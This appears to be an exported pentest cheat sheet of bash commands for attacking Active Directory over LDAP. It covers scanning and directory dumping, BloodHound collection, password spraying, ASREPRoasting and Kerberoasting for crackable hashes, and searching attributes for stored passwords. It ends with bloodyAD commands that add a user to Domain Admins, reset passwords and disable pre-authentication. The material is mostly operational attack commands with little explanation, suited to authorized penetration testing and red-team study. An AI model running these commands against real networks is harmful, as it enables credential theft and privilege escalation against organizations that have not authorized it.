---
id: "uoac3mbtampsitwyj"
title: "ldap"
description: ""
tags: []
order: 9
createdAt: "2026-05-30T15:44:10.267Z"
updatedAt: "2026-05-30T15:44:20.860Z"
---

## Port Discovery & Scanning
<!-- section: {"id":"wjtp89xjsmpsiu4us","order":0,"collapsed":false} -->

### ncmxmhuvwmpsiu4wk
```bash
nmap -sV -sC -p 389,636,3268,3269 $TARGET
```

_Port Discovery & Scanning Scan for LDAP (389) and LDAPS (636) with version detection._

**Tags:** ldap, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"ncmxmhuvwmpsiu4wk","language":"bash","sectionId":"wjtp89xjsmpsiu4us","tags":["ldap","nmap","rustscan","recon","discovery"]} -->

### s605c81pempsiu4wp
```bash
nmap -p 389,636 --script ldap-rootdse,ldap-search,ldap-brute $TARGET
```

**Tags:** ldap, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"s605c81pempsiu4wp","language":"bash","sectionId":"wjtp89xjsmpsiu4us","tags":["ldap","nmap","rustscan","recon","discovery"]} -->

### d3pwxo0d3mpsiu4wt
```bash
rustscan -a $TARGET -p 389,636,3268,3269 -- -sV --script ldap-rootdse
```

**Tags:** ldap, nmap, rustscan, recon, discovery
<!-- cmd: {"id":"d3pwxo0d3mpsiu4wt","language":"bash","sectionId":"wjtp89xjsmpsiu4us","tags":["ldap","nmap","rustscan","recon","discovery"]} -->

## Anonymous Bind Enumeration
<!-- section: {"id":"fkmie8mdmmpsiu4uw","order":1,"collapsed":false} -->

### rz3m4s1ymmpsiu4x6
```bash
ldapsearch -x -H ldap://$TARGET -b "" -s base
```

_Anonymous Bind Enumeration Check if anonymous LDAP bind is allowed — often misconfigured._

**Tags:** ldap, anonymous, enumeration, unauthenticated
<!-- cmd: {"id":"rz3m4s1ymmpsiu4x6","language":"bash","sectionId":"fkmie8mdmmpsiu4uw","tags":["ldap","anonymous","enumeration","unauthenticated"]} -->

### i2hfv80i5mpsiu4xa
```bash
ldapsearch -x -H ldap://$TARGET -b "DC=$DOMAIN,DC=local" "(objectClass=*)"
```

**Tags:** ldap, anonymous, enumeration, unauthenticated
<!-- cmd: {"id":"i2hfv80i5mpsiu4xa","language":"bash","sectionId":"fkmie8mdmmpsiu4uw","tags":["ldap","anonymous","enumeration","unauthenticated"]} -->

### lrs9cs45umpsiu4xe
```bash
ldapsearch -x -H ldap://$TARGET -b "DC=$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName
```

**Tags:** ldap, anonymous, enumeration, unauthenticated
<!-- cmd: {"id":"lrs9cs45umpsiu4xe","language":"bash","sectionId":"fkmie8mdmmpsiu4uw","tags":["ldap","anonymous","enumeration","unauthenticated"]} -->

## Authenticated LDAP Enumeration
<!-- section: {"id":"p0uguy04lmpsiu4uz","order":2,"collapsed":false} -->

### qmdrymc0impsiu4xq
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(objectClass=*)"
```

_Authenticated LDAP Enumeration Dump all AD objects with valid credentials._

**Tags:** ldap, authenticated, enumeration, users, groups
<!-- cmd: {"id":"qmdrymc0impsiu4xq","language":"bash","sectionId":"p0uguy04lmpsiu4uz","tags":["ldap","authenticated","enumeration","users","groups"]} -->

### repvxmci1mpsiu4xu
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName mail memberOf
```

**Tags:** ldap, authenticated, enumeration, users, groups
<!-- cmd: {"id":"repvxmci1mpsiu4xu","language":"bash","sectionId":"p0uguy04lmpsiu4uz","tags":["ldap","authenticated","enumeration","users","groups"]} -->

### djefil43ompsiu4xy
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(objectClass=group)" cn member
```

**Tags:** ldap, authenticated, enumeration, users, groups
<!-- cmd: {"id":"djefil43ompsiu4xy","language":"bash","sectionId":"p0uguy04lmpsiu4uz","tags":["ldap","authenticated","enumeration","users","groups"]} -->

## ldapdomaindump
<!-- section: {"id":"kpczop5ehmpsiu4v3","order":3,"collapsed":false} -->

### ir8eo577empsiu4y6
```bash
ldapdomaindump -u '$DOMAIN\$USER' -p '$PASS' $TARGET
```

_ldapdomaindump Dump entire AD structure to HTML/JSON — great for offline review._

**Tags:** ldap, ldapdomaindump, ad-enumeration, dump
<!-- cmd: {"id":"ir8eo577empsiu4y6","language":"bash","sectionId":"kpczop5ehmpsiu4v3","tags":["ldap","ldapdomaindump","ad-enumeration","dump"]} -->

### sxm94az8smpsiu4y9
```bash
ldapdomaindump -u '$DOMAIN\$USER' -p '$PASS' ldap://$TARGET -o ./ldap_dump/
```

**Tags:** ldap, ldapdomaindump, ad-enumeration, dump
<!-- cmd: {"id":"sxm94az8smpsiu4y9","language":"bash","sectionId":"kpczop5ehmpsiu4v3","tags":["ldap","ldapdomaindump","ad-enumeration","dump"]} -->

## BloodHound Python Collection via LDAP
<!-- section: {"id":"7b28erchumpsiu4v6","order":4,"collapsed":false} -->

### 3pl082rf4mpsiu4yl
```bash
bloodhound-python -u $USER -p '$PASS' -d $DOMAIN -dc $DC -c All --zip
```

_BloodHound Python Collection via LDAP Collect AD data for BloodHound graph analysis._

**Tags:** ldap, bloodhound, ad-enumeration, graph
<!-- cmd: {"id":"3pl082rf4mpsiu4yl","language":"bash","sectionId":"7b28erchumpsiu4v6","tags":["ldap","bloodhound","ad-enumeration","graph"]} -->

### yb0qiuukgmpsiu4yp
```bash
bloodhound-python -u $USER -p '$PASS' -d $DOMAIN -dc $DC -c DCOnly --zip
```

**Tags:** ldap, bloodhound, ad-enumeration, graph
<!-- cmd: {"id":"yb0qiuukgmpsiu4yp","language":"bash","sectionId":"7b28erchumpsiu4v6","tags":["ldap","bloodhound","ad-enumeration","graph"]} -->

### 1no9nohnmmpsiu4yt
```bash
bloodhound-python -u $USER --hashes :$HASH -d $DOMAIN -dc $DC -c All --zip
```

**Tags:** ldap, bloodhound, ad-enumeration, graph
<!-- cmd: {"id":"1no9nohnmmpsiu4yt","language":"bash","sectionId":"7b28erchumpsiu4v6","tags":["ldap","bloodhound","ad-enumeration","graph"]} -->

## enum4linux-ng LDAP Enumeration
<!-- section: {"id":"8ojiu0h1rmpsiu4va","order":5,"collapsed":false} -->

### w6o5ggm8bmpsiu4z1
```bash
enum4linux-ng -A $TARGET
```

_enum4linux-ng LDAP Enumeration Full LDAP/SMB/RPC enumeration in one tool._

**Tags:** ldap, enum4linux-ng, enumeration, anonymous
<!-- cmd: {"id":"w6o5ggm8bmpsiu4z1","language":"bash","sectionId":"8ojiu0h1rmpsiu4va","tags":["ldap","enum4linux-ng","enumeration","anonymous"]} -->

### vma6mc2y0mpsiu4z4
```bash
enum4linux-ng -A -u $USER -p '$PASS' $TARGET
```

**Tags:** ldap, enum4linux-ng, enumeration, anonymous
<!-- cmd: {"id":"vma6mc2y0mpsiu4z4","language":"bash","sectionId":"8ojiu0h1rmpsiu4va","tags":["ldap","enum4linux-ng","enumeration","anonymous"]} -->

### 09o7a8cp8mpsiu4z8
```bash
enum4linux-ng -L $TARGET
```

**Tags:** ldap, enum4linux-ng, enumeration, anonymous
<!-- cmd: {"id":"09o7a8cp8mpsiu4z8","language":"bash","sectionId":"8ojiu0h1rmpsiu4va","tags":["ldap","enum4linux-ng","enumeration","anonymous"]} -->

## NetExec LDAP Enumeration
<!-- section: {"id":"3dkc1kn5cmpsiu4vd","order":6,"collapsed":false} -->

### c1mrc8uoympsiu4zm
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --users
```

_NetExec LDAP Enumeration Fast AD enumeration via LDAP using netexec._

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"c1mrc8uoympsiu4zm","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### 1jafv9tqrmpsiu4zp
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --groups
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"1jafv9tqrmpsiu4zp","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### egcr5oacempsiu4zt
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --password-not-required
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"egcr5oacempsiu4zt","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### 3ra1veh1ympsiu4zx
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --admin-count
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"3ra1veh1ympsiu4zx","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### ehna0k91fmpsiu500
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --trusted-for-delegation
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"ehna0k91fmpsiu500","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### p6p46kce7mpsiu504
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --get-sid
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"p6p46kce7mpsiu504","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

### pupt15t17mpsiu508
```bash
netexec ldap $TARGET -u $USER -p '$PASS' -M get-desc-users
```

**Tags:** ldap, netexec, ad-enumeration, users, delegation
<!-- cmd: {"id":"pupt15t17mpsiu508","language":"bash","sectionId":"3dkc1kn5cmpsiu4vd","tags":["ldap","netexec","ad-enumeration","users","delegation"]} -->

## LDAP Password Spray
<!-- section: {"id":"qwkyjwilzmpsiu4vh","order":7,"collapsed":false} -->

### a2xujpw7mmpsiu50n
```bash
netexec ldap $TARGET -u users.txt -p '$PASS' --continue-on-success
```

_LDAP Password Spray Spray credentials over LDAP — avoids some lockout policies vs SMB._

**Tags:** ldap, password-spray, bruteforce, authentication
<!-- cmd: {"id":"a2xujpw7mmpsiu50n","language":"bash","sectionId":"qwkyjwilzmpsiu4vh","tags":["ldap","password-spray","bruteforce","authentication"]} -->

### fq6yawneempsiu50r
```bash
netexec ldap $TARGET -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

**Tags:** ldap, password-spray, bruteforce, authentication
<!-- cmd: {"id":"fq6yawneempsiu50r","language":"bash","sectionId":"qwkyjwilzmpsiu4vh","tags":["ldap","password-spray","bruteforce","authentication"]} -->

### 0nyg0f1m2mpsiu50u
```bash
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt '$PASS'
```

**Tags:** ldap, password-spray, bruteforce, authentication
<!-- cmd: {"id":"0nyg0f1m2mpsiu50u","language":"bash","sectionId":"qwkyjwilzmpsiu4vh","tags":["ldap","password-spray","bruteforce","authentication"]} -->

## ASREPRoasting via LDAP
<!-- section: {"id":"er0hzvesampsiu4vk","order":8,"collapsed":false} -->

### 4k8vdiyubmpsiu513
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --asreproast asrep.txt
```

_ASREPRoasting via LDAP Find accounts without Kerberos pre-authentication._

**Tags:** ldap, asreproasting, kerberos, credentials
<!-- cmd: {"id":"4k8vdiyubmpsiu513","language":"bash","sectionId":"er0hzvesampsiu4vk","tags":["ldap","asreproasting","kerberos","credentials"]} -->

### 5bu6v8c46mpsiu517
```bash
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -outputfile asrep_hashes.txt
```

**Tags:** ldap, asreproasting, kerberos, credentials
<!-- cmd: {"id":"5bu6v8c46mpsiu517","language":"bash","sectionId":"er0hzvesampsiu4vk","tags":["ldap","asreproasting","kerberos","credentials"]} -->

### ln4ee8esimpsiu51a
```bash
impacket-GetNPUsers $DOMAIN/$USER:'$PASS' -dc-ip $DC -request -outputfile asrep_hashes.txt
```

**Tags:** ldap, asreproasting, kerberos, credentials
<!-- cmd: {"id":"ln4ee8esimpsiu51a","language":"bash","sectionId":"er0hzvesampsiu4vk","tags":["ldap","asreproasting","kerberos","credentials"]} -->

## Kerberoasting via LDAP
<!-- section: {"id":"ekdawet0pmpsiu4vn","order":9,"collapsed":false} -->

### 79z05zz4dmpsiu51w
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --kerberoasting kerb.txt
```

_Kerberoasting via LDAP Request TGS tickets for SPN-linked accounts._

**Tags:** ldap, kerberoasting, kerberos, spn, credentials
<!-- cmd: {"id":"79z05zz4dmpsiu51w","language":"bash","sectionId":"ekdawet0pmpsiu4vn","tags":["ldap","kerberoasting","kerberos","spn","credentials"]} -->

### bg9ms8qa5mpsiu520
```bash
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC -request -outputfile kerb_hashes.txt
```

**Tags:** ldap, kerberoasting, kerberos, spn, credentials
<!-- cmd: {"id":"bg9ms8qa5mpsiu520","language":"bash","sectionId":"ekdawet0pmpsiu4vn","tags":["ldap","kerberoasting","kerberos","spn","credentials"]} -->

### 3mtekeucqmpsiu523
```bash
targetedKerberoast.py -d $DOMAIN -u $USER -p '$PASS' --dc-ip $DC -o kerb_targeted.txt
```

**Tags:** ldap, kerberoasting, kerberos, spn, credentials
<!-- cmd: {"id":"3mtekeucqmpsiu523","language":"bash","sectionId":"ekdawet0pmpsiu4vn","tags":["ldap","kerberoasting","kerberos","spn","credentials"]} -->

## LDAP Signing Check
<!-- section: {"id":"02ks5qqb3mpsiu4vr","order":10,"collapsed":false} -->

### 2gsigiz7tmpsiu52c
```bash
netexec ldap $TARGET -u $USER -p '$PASS' -M ldap-checker
```

_LDAP Signing Check Check if LDAP signing is enforced — prerequisite for relay attacks._

**Tags:** ldap, signing, misconfiguration, relay, ntlm
<!-- cmd: {"id":"2gsigiz7tmpsiu52c","language":"bash","sectionId":"02ks5qqb3mpsiu4vr","tags":["ldap","signing","misconfiguration","relay","ntlm"]} -->

### 9bmvunxtjmpsiu52g
```bash
python3 ldap-scanner.py -H $TARGET
```

**Tags:** ldap, signing, misconfiguration, relay, ntlm
<!-- cmd: {"id":"9bmvunxtjmpsiu52g","language":"bash","sectionId":"02ks5qqb3mpsiu4vr","tags":["ldap","signing","misconfiguration","relay","ntlm"]} -->

### ci93cfaf5mpsiu52k
```bash
nmap --script ldap-search -p 389 $TARGET
```

**Tags:** ldap, signing, misconfiguration, relay, ntlm
<!-- cmd: {"id":"ci93cfaf5mpsiu52k","language":"bash","sectionId":"02ks5qqb3mpsiu4vr","tags":["ldap","signing","misconfiguration","relay","ntlm"]} -->

## Dangerous LDAP Attributes
<!-- section: {"id":"ijjuhaadhmpsiu4vv","order":11,"collapsed":false} -->

### sra0q5jdympsiu52s
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(&(objectClass=user)(userPassword=*))" sAMAccountName userPassword
```

_Dangerous LDAP Attributes Find interesting attributes: passwords in description, delegation, etc._

**Tags:** ldap, credentials, passwords, description, delegation
<!-- cmd: {"id":"sra0q5jdympsiu52s","language":"bash","sectionId":"ijjuhaadhmpsiu4vv","tags":["ldap","credentials","passwords","description","delegation"]} -->

### hvr8l1g1cmpsiu52w
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(description=*pass*)" sAMAccountName description
```

**Tags:** ldap, credentials, passwords, description, delegation
<!-- cmd: {"id":"hvr8l1g1cmpsiu52w","language":"bash","sectionId":"ijjuhaadhmpsiu4vv","tags":["ldap","credentials","passwords","description","delegation"]} -->

### jjdur4shjmpsiu530
```bash
ldapsearch -x -H ldap://$TARGET -D "$USER@$DOMAIN" -w '$PASS' -b "DC=$DOMAIN,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName
```

**Tags:** ldap, credentials, passwords, description, delegation
<!-- cmd: {"id":"jjdur4shjmpsiu530","language":"bash","sectionId":"ijjuhaadhmpsiu4vv","tags":["ldap","credentials","passwords","description","delegation"]} -->

## LDAP ACL / DACL Enumeration
<!-- section: {"id":"jquv8vbphmpsiu4vy","order":12,"collapsed":false} -->

### 3yizi0n3ympsiu53e
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' get object $USER --attr nTSecurityDescriptor
```

_LDAP ACL / DACL Enumeration Find abusable ACEs — WriteDACL, GenericAll, GenericWrite, etc._

**Tags:** ldap, acl, dacl, ad-abuse, bloodyad
<!-- cmd: {"id":"3yizi0n3ympsiu53e","language":"bash","sectionId":"jquv8vbphmpsiu4vy","tags":["ldap","acl","dacl","ad-abuse","bloodyad"]} -->

### ji12va4xdmpsiu53i
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' get writable
```

**Tags:** ldap, acl, dacl, ad-abuse, bloodyad
<!-- cmd: {"id":"ji12va4xdmpsiu53i","language":"bash","sectionId":"jquv8vbphmpsiu4vy","tags":["ldap","acl","dacl","ad-abuse","bloodyad"]} -->

### m10iaouycmpsiu53n
```bash
python3 dacledit.py -action read -target $USER -dc-ip $DC $DOMAIN/$USER:'$PASS'
```

**Tags:** ldap, acl, dacl, ad-abuse, bloodyad
<!-- cmd: {"id":"m10iaouycmpsiu53n","language":"bash","sectionId":"jquv8vbphmpsiu4vy","tags":["ldap","acl","dacl","ad-abuse","bloodyad"]} -->

## LDAP Object Modification (Abuse)
<!-- section: {"id":"k3xel642pmpsiu4w2","order":13,"collapsed":false} -->

### eej5smpk9mpsiu53u
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' add groupMember "Domain Admins" $USER
```

_LDAP Object Modification (Abuse) Modify AD objects via LDAP with bloodyAD._

**Tags:** ldap, bloodyad, ad-abuse, privilege-escalation, persistence
<!-- cmd: {"id":"eej5smpk9mpsiu53u","language":"bash","sectionId":"k3xel642pmpsiu4w2","tags":["ldap","bloodyad","ad-abuse","privilege-escalation","persistence"]} -->

### 6433z99ucmpsiu53y
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' set password $USER 'NewP@ss123!'
```

**Tags:** ldap, bloodyad, ad-abuse, privilege-escalation, persistence
<!-- cmd: {"id":"6433z99ucmpsiu53y","language":"bash","sectionId":"k3xel642pmpsiu4w2","tags":["ldap","bloodyad","ad-abuse","privilege-escalation","persistence"]} -->

### yxhdlnnrxmpsiu541
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' add uac $USER DONT_REQ_PREAUTH
```

**Tags:** ldap, bloodyad, ad-abuse, privilege-escalation, persistence
<!-- cmd: {"id":"yxhdlnnrxmpsiu541","language":"bash","sectionId":"k3xel642pmpsiu4w2","tags":["ldap","bloodyad","ad-abuse","privilege-escalation","persistence"]} -->

### g1aaaiqb9mpsiu545
```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p '$PASS' set object $USER servicePrincipalName -v "http/fake.domain.local"
```

**Tags:** ldap, bloodyad, ad-abuse, privilege-escalation, persistence
<!-- cmd: {"id":"g1aaaiqb9mpsiu545","language":"bash","sectionId":"k3xel642pmpsiu4w2","tags":["ldap","bloodyad","ad-abuse","privilege-escalation","persistence"]} -->

## Common Misconfigurations
<!-- section: {"id":"7bkxn898empsiu4w5","order":14,"collapsed":false} -->

### yq1q3h40lmpsiu54e
```bash
ldapsearch -x -H ldap://$TARGET -b "DC=$DOMAIN,DC=local"
```

_Common Misconfigurations_

**Tags:** ldap, misconfiguration, anonymous, signing, delegation
<!-- cmd: {"id":"yq1q3h40lmpsiu54e","language":"bash","sectionId":"7bkxn898empsiu4w5","tags":["ldap","misconfiguration","anonymous","signing","delegation"]} -->

### 8rjlr9z4umpsiu54h
```bash
netexec ldap $TARGET -u '' -p '' -M ldap-checker
```

**Tags:** ldap, misconfiguration, anonymous, signing, delegation
<!-- cmd: {"id":"8rjlr9z4umpsiu54h","language":"bash","sectionId":"7bkxn898empsiu4w5","tags":["ldap","misconfiguration","anonymous","signing","delegation"]} -->

### hqxx3g076mpsiu54l
```bash
netexec ldap $TARGET -u $USER -p '$PASS' -M get-desc-users
```

**Tags:** ldap, misconfiguration, anonymous, signing, delegation
<!-- cmd: {"id":"hqxx3g076mpsiu54l","language":"bash","sectionId":"7bkxn898empsiu4w5","tags":["ldap","misconfiguration","anonymous","signing","delegation"]} -->

### lqw43e7j6mpsiu54o
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --asreproast /dev/stdout
```

**Tags:** ldap, misconfiguration, anonymous, signing, delegation
<!-- cmd: {"id":"lqw43e7j6mpsiu54o","language":"bash","sectionId":"7bkxn898empsiu4w5","tags":["ldap","misconfiguration","anonymous","signing","delegation"]} -->

### o8tw0ah49mpsiu54s
```bash
netexec ldap $TARGET -u $USER -p '$PASS' --trusted-for-delegation
```

**Tags:** ldap, misconfiguration, anonymous, signing, delegation
<!-- cmd: {"id":"o8tw0ah49mpsiu54s","language":"bash","sectionId":"7bkxn898empsiu4w5","tags":["ldap","misconfiguration","anonymous","signing","delegation"]} -->
